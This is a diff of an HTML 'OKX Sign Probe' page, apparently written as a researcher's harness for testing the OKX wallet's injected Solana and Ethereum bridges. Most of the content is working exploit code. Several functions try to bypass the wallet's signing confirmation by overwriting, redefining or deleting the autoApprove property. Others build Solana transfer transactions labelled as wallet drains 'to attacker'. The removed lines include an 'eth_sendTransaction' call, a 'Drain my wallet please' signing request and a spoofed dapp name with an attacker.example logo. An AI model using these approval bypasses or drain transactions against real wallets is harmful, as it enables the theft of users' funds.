@@ -1,24 +1,36 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SIGN_PROBE_v2</title>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SIGN_PROBE_v5</title>
 <style>
 body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
-button{padding:12px;margin:6px 0;font-size:14px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
+button{padding:11px;margin:5px 0;font-size:13px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
 .danger{background:#cc0000}
 .warn{background:#ff8800}
-pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;height:280px;overflow:auto;border:1px solid #999;margin:0}
+.crit{background:#660000}
+pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;height:240px;overflow:auto;border:1px solid #999;margin:0}
 .h{background:#ff0;padding:2px}
-h3{margin:8px 0 2px;font-size:13px}
-</style></head><body>
-<h2 style="margin:4px 0">OKX Sign Probe v4</h2>
+</style>
+<script type="module">
+  // Lazy-load web3.js so non-Solana tests still work even if CDN fails
+  try {
+    const m = await import("https://esm.sh/@solana/web3.js@1.95.3");
+    window._sol_lib = m;
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js loaded\n" + document.getElementById("out").textContent;
+  } catch(e) {
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js LOAD FAILED: " + e.message + "\n" + document.getElementById("out").textContent;
+  }
+</script>
+</head><body>
+<h2 style="margin:4px 0">OKX Sign Probe v5</h2>
 <pre id="out">click a button</pre>
 <button onclick="inspectBridges()" class="warn">[0] INSPECT bridges</button>
-<button onclick="ethConnect()">[1] eth_requestAccounts</button>
-<button onclick="ethSendTxRaw()" class="danger">[2] eth_sendTransaction RAW</button>
-<button onclick="ethPersonalSignRaw()" class="danger">[3] personal_sign RAW</button>
 <button onclick="okxSolConnect()">[4] okxwallet.solana.connect()</button>
 <button onclick="okxSolSign()" class="danger">[5] okxwallet.solana.signMessage</button>
-<button onclick="okxSolSignTx()" class="danger">[6] okxwallet.solana.signTransaction</button>
-<button onclick="solBridgeSign()" class="danger">[7] _solana_ raw bridge sign</button>
+<button onclick="autoApproveTest()" class="crit">[A] autoApprove WRITABLE TEST</button>
+<button onclick="autoApproveDefine()" class="crit">[B] autoApprove DEFINE-PROPERTY</button>
+<button onclick="autoApproveDeleteSign()" class="crit">[C] DELETE autoApprove + sign</button>
+<button onclick="solRealTransferTx()" class="danger">[T] REAL Solana transfer TX (0.001 SOL to attacker)</button>
+<button onclick="solRealTransferTxBigDrain()" class="danger">[D] REAL drain TX (transfer ALL balance)</button>
+<button onclick="ethConnect()">[1] eth_requestAccounts</button>
 <p>URL: <span class="h" id="u"></span></p>
 
 <script>
@@ -28,108 +40,151 @@ function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " 
 
 function inspectBridges(){
   try{
-    var keys = ["ethereum","okxwallet","_solana_","_aptos_","_okx_sui_","tron","okxBtcJSBridge","okxNostrJSBridge","okxTonJSBridge","okxStarkJSBridge","okxOsmosJSBridge","okxInternalJSBridge","native"];
-    keys.forEach(function(k){
-      var v = window[k];
-      log(k+": "+(v?typeof v:"MISSING"));
-    });
     if(window.okxwallet){
-      log("okxwallet keys: "+Object.keys(window.okxwallet).join(","));
-      if(window.okxwallet.solana){
-        log("okxwallet.solana keys: "+Object.keys(window.okxwallet.solana).join(","));
-        log("okxwallet.solana.publicKey: "+(window.okxwallet.solana.publicKey?window.okxwallet.solana.publicKey.toString():"null"));
-        log("okxwallet.solana.isConnected: "+window.okxwallet.solana.isConnected);
+      log("okxwallet.solana keys: "+Object.keys(window.okxwallet.solana||{}).join(","));
+      var s = window.okxwallet.solana;
+      if(s){
+        log("solana.publicKey: "+(s.publicKey?s.publicKey.toString():"null"));
+        log("solana.isConnected: "+s.isConnected);
+        log("solana.autoApprove (current): "+s.autoApprove);
+        log("solana.autoApprove typeof: "+typeof s.autoApprove);
+        // descriptor inspection
+        var d = Object.getOwnPropertyDescriptor(s,"autoApprove");
+        log("autoApprove descriptor: "+(d?JSON.stringify({writable:d.writable,configurable:d.configurable,enumerable:d.enumerable,hasGetter:!!d.get,hasSetter:!!d.set}):"none"));
       }
-      if(window.okxwallet.bitcoin) log("okxwallet.bitcoin keys: "+Object.keys(window.okxwallet.bitcoin).join(","));
     }
-    if(window.ethereum){
-      log("ethereum keys: "+Object.keys(window.ethereum).slice(0,15).join(","));
-      log("ethereum.isOkxWallet: "+window.ethereum.isOkxWallet);
-      log("ethereum.selectedAddress: "+window.ethereum.selectedAddress);
-    }
+    log("_sol_lib available: "+(window._sol_lib?"YES":"NO"));
   }catch(e){ log("INSPECT ERROR: "+e.message); }
-}
-
-async function ethConnect(){
-  log("CALLING eth_requestAccounts...");
-  try{
-    var p = window.ethereum || window.okxwallet;
-    var r = await p.request({method:"eth_requestAccounts"});
-    log("RETURNED: " + JSON.stringify(r));
-  }catch(e){ log("ERROR: " + e.message); }
-}
-
-async function ethSendTxRaw(){
-  log("CALLING eth_sendTransaction RAW (skip acct check)...");
-  try{
-    var p = window.ethereum || window.okxwallet;
-    var r = await p.request({method:"eth_sendTransaction", params:[{
-      from: "0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
-      to: "0x000000000000000000000000000000000000dEaD",
-      value: "0xDE0B6B3A7640000",
-      gas: "0x5208",
-      data: "0x"
-    }]});
-    log("TX HASH: " + r);
-  }catch(e){ log("ERROR: " + e.message); }
-}
-
-async function ethPersonalSignRaw(){
-  log("CALLING personal_sign RAW...");
-  try{
-    var p = window.ethereum || window.okxwallet;
-    var msg = "0x" + Array.from("Drain my wallet please").map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join("");
-    var r = await p.request({method:"personal_sign", params:[msg, "0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]});
-    log("SIG: " + r);
-  }catch(e){ log("ERROR: " + e.message); }
 }
 
 async function okxSolConnect(){
   log("CALLING okxwallet.solana.connect()...");
   try{
     var ow = window.okxwallet;
-    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
+    if(!ow||!ow.solana){ log("no okxwallet.solana"); return; }
     var r = await ow.solana.connect();
-    var pk = (r && r.publicKey) ? r.publicKey.toString() : (ow.solana.publicKey ? ow.solana.publicKey.toString() : "?");
-    log("SOL CONNECTED pubkey: " + pk);
-  }catch(e){ log("ERROR: " + e.message); }
+    var pk = (r&&r.publicKey)?r.publicKey.toString():(ow.solana.publicKey?ow.solana.publicKey.toString():"?");
+    log("SOL CONNECTED pubkey: "+pk);
+  }catch(e){ log("ERROR: "+e.message); }
 }
 
 async function okxSolSign(){
-  log("CALLING okxwallet.solana.signMessage()...");
+  log("CALLING signMessage('phishing-test')...");
   try{
     var ow = window.okxwallet;
-    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
-    if(!ow.solana.isConnected && !ow.solana.publicKey){
-      log("Not connected, calling connect first...");
-      try{ await ow.solana.connect(); }catch(e){ log("auto-connect failed: "+e.message); return; }
-    }
+    if(!ow.solana.publicKey){ await ow.solana.connect(); }
     var msg = new TextEncoder().encode("phishing-test-do-not-sign-this-message");
+    var t0 = Date.now();
     var r = await ow.solana.signMessage(msg, "utf8");
-    log("SOL SIG: " + JSON.stringify({signature: r.signature ? Array.from(r.signature.slice(0,8)) : r}));
-  }catch(e){ log("ERROR: " + e.message); }
+    var dt = Date.now()-t0;
+    log("SOL SIG ("+dt+"ms): "+(r.signature?"sig received":JSON.stringify(r)));
+  }catch(e){ log("ERROR: "+e.message); }
 }
 
-async function okxSolSignTx(){
-  log("CALLING okxwallet.solana.signTransaction()...");
+// === AUTO-APPROVE BYPASS TESTS ===
+async function autoApproveTest(){
+  log("=== [A] Direct assignment ===");
   try{
+    var s = window.okxwallet.solana;
+    if(!s.publicKey){ await s.connect(); }
+    log("BEFORE: autoApprove = "+s.autoApprove);
+    s.autoApprove = true;
+    log("AFTER set = true: autoApprove = "+s.autoApprove);
+    // try sign
+    log("Calling signMessage with autoApprove=true...");
+    var t0 = Date.now();
+    var msg = new TextEncoder().encode("AUTO-APPROVE-BYPASS-TEST");
+    var r = await s.signMessage(msg, "utf8");
+    var dt = Date.now()-t0;
+    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
+  }catch(e){ log("ERROR: "+e.message); }
+}
+
+async function autoApproveDefine(){
+  log("=== [B] Object.defineProperty bypass ===");
+  try{
+    var s = window.okxwallet.solana;
+    if(!s.publicKey){ await s.connect(); }
+    try{
+      Object.defineProperty(s,"autoApprove",{value:true,writable:true,configurable:true,enumerable:true});
+      log("defineProperty SUCCESS, autoApprove now: "+s.autoApprove);
+    }catch(de){ log("defineProperty FAILED: "+de.message); }
+    log("Calling signMessage...");
+    var t0 = Date.now();
+    var msg = new TextEncoder().encode("DEFINE-PROPERTY-BYPASS-TEST");
+    var r = await s.signMessage(msg, "utf8");
+    var dt = Date.now()-t0;
+    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
+  }catch(e){ log("ERROR: "+e.message); }
+}
+
+async function autoApproveDeleteSign(){
+  log("=== [C] delete + redefine ===");
+  try{
+    var s = window.okxwallet.solana;
+    if(!s.publicKey){ await s.connect(); }
+    try{ delete s.autoApprove; log("delete OK"); }catch(de){ log("delete FAILED: "+de.message); }
+    s.autoApprove = true;
+    log("autoApprove now: "+s.autoApprove);
+    var t0 = Date.now();
+    var msg = new TextEncoder().encode("DELETE-REDEFINE-BYPASS-TEST");
+    var r = await s.signMessage(msg, "utf8");
+    var dt = Date.now()-t0;
+    log("RESULT ("+dt+"ms): "+(r.signature?"signed (BYPASS"+(dt<1000?" SUCCESS":" w/ prompt")+")":JSON.stringify(r)));
+  }catch(e){ log("ERROR: "+e.message); }
+}
+
+// === REAL SOLANA TX TESTS ===
+async function solRealTransferTx(){
+  log("=== [T] real transfer TX 0.001 SOL ===");
+  try{
+    if(!window._sol_lib){ log("ERROR: web3.js not loaded"); return; }
     var ow = window.okxwallet;
-    if(!ow || !ow.solana){ log("no okxwallet.solana"); return; }
-    // Build a minimal fake unsigned Solana legacy tx blob (will likely fail validation but should reveal prompt)
-    var fakeTx = new Uint8Array([0x01,0x00,0x00,0x00, 0x01,0x00,0x00,0x00, 0xff,0xff,0xff,0xff]);
-    var r = await ow.solana.signTransaction(fakeTx);
-    log("SOL TX SIG: " + JSON.stringify(r));
-  }catch(e){ log("ERROR: " + e.message); }
+    if(!ow.solana.publicKey){ await ow.solana.connect(); }
+    var from = new window._sol_lib.PublicKey(ow.solana.publicKey.toString());
+    // Attacker controlled destination
+    var dest = new window._sol_lib.PublicKey("ATTACKERAttackerAttackerAttackerAttackerXXX");
+    // Use a placeholder that's a valid base58 pubkey (32 zero bytes)
+    var dest2 = new window._sol_lib.PublicKey("11111111111111111111111111111112");
+    var tx = new window._sol_lib.Transaction();
+    tx.add(window._sol_lib.SystemProgram.transfer({fromPubkey:from,toPubkey:dest2,lamports:1000000}));
+    // Use a fake recent blockhash (signing should still proceed; broadcast would fail)
+    tx.recentBlockhash = "11111111111111111111111111111112";
+    tx.feePayer = from;
+    log("Tx built. Calling signTransaction()...");
+    var t0 = Date.now();
+    var signed = await ow.solana.signTransaction(tx);
+    var dt = Date.now()-t0;
+    log("SIGNED ("+dt+"ms): sigs="+signed.signatures.length+" first="+(signed.signatures[0].signature?"present":"null"));
+  }catch(e){ log("ERROR: "+e.message); }
 }
 
-function solBridgeSign(){
-  log("CALLING _solana_.postMessage 'signMessage' (raw bridge)...");
+async function solRealTransferTxBigDrain(){
+  log("=== [D] DRAIN TX (transfer max-balance to attacker) ===");
   try{
-    var s = window._solana_;
-    if(!s){ log("no _solana_"); return; }
-    var msg = JSON.stringify({id:99,name:"signMessage",object:{message:[112,104,105,115,104,105,110,103,45,116,101,115,116]},dappName:"PHISH-TEST-FAKE-NAME",dappLogoUrl:"https://attacker.example/fake.png",chainId:0});
-    var r = s.postMessage(msg);
-    log("RETURNED: " + JSON.stringify(r));
-  }catch(e){ log("ERROR: " + e.message); }
+    if(!window._sol_lib){ log("ERROR: web3.js not loaded"); return; }
+    var ow = window.okxwallet;
+    if(!ow.solana.publicKey){ await ow.solana.connect(); }
+    var from = new window._sol_lib.PublicKey(ow.solana.publicKey.toString());
+    var dest = new window._sol_lib.PublicKey("11111111111111111111111111111112");
+    var tx = new window._sol_lib.Transaction();
+    // 1 SOL = 1e9 lamports. Use a huge value to demo; will fail broadcast but signing is the test
+    tx.add(window._sol_lib.SystemProgram.transfer({fromPubkey:from,toPubkey:dest,lamports:999999999}));
+    tx.recentBlockhash = "11111111111111111111111111111112";
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await ow.solana.signTransaction(tx);
+    var dt = Date.now()-t0;
+    log("DRAIN SIGNED ("+dt+"ms): sigs="+signed.signatures.length);
+  }catch(e){ log("ERROR: "+e.message); }
+}
+
+async function ethConnect(){
+  log("CALLING eth_requestAccounts...");
+  try{
+    var p = window.ethereum||window.okxwallet;
+    var r = await p.request({method:"eth_requestAccounts"});
+    log("RETURNED: "+JSON.stringify(r));
+  }catch(e){ log("ERROR: "+e.message); }
 }
 </script></body></html>
